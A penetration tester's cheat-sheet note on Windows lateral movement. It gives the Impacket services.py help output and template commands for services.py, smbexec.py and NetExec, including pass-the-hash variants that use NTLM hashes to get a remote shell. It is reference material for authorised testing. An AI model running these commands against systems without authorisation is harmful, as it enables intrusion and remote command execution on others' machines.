# Unix Shell

Search Tag(s): #lateral-movement #service-control-manager #impacket #windows

## 01 - Impacket

### 1.1 - Services

#### 1.1.1 - Help Menu

```
$ services.py -h
Impacket v0.11.0 - Copyright 2023 Fortra

usage: services.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address]
                   [-port [destination port]]
                   target {start,stop,delete,status,config,list,create,change} ...

Windows Service manipulation script.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  {start,stop,delete,status,config,list,create,change}
                        actions
    start               starts the service
    stop                stops the service
    delete              deletes the service
    status              returns service status
    config              returns service configuration
    list                list available services
    create              create a service
    change              change a service configuration

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                        credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target
                        is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```

#### 1.1.2 - Usage

TODO: Fill this info

```
$ services.py [<domain>/]<username>:<password>@<IP> [-codecs <codec>] list
```

Pass the Hash

```
$ services.py [<domain>/]<username>@<IP> -hashes <ntlm_hash> list

$ services.py [<domain>/]<username>@<IP> -hashes 0000000000000000000000000000000:<NT> list

$ services.py [<domain>/]<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<NT> list
```

### 1.2 - SMBExec

Authenticate via impacket script with `smbexec`.

```
$ smbexec.py [<domain>/]<username>:<password>@<IP> -shell-type <cmd.exe | powershell.exe> [-codecs <codec>]
```

Pass the Hash

```
$ smbexec.py <username>@<IP> -hashes <ntlm_hash>

$ smbexec.py [<domain>/]<username>@<IP> -hashes 0000000000000000000000000000000:<NT>

$ smbexec.py [<domain>/]<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<NT>
```

## 02 - NetExec

```
$ netexec smb <IP> --exec-method smbexec -u "<username>" -p "<password>" [-d <domain> | --local-auth]

$ netexec smb <IP> --exec-method smbexec -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```

---
## References

- [Hacktricks: SmbExec/ScExec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)

- [nv2lt: Windows Lateral Movement with SMB, PsExec and Alternatives](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)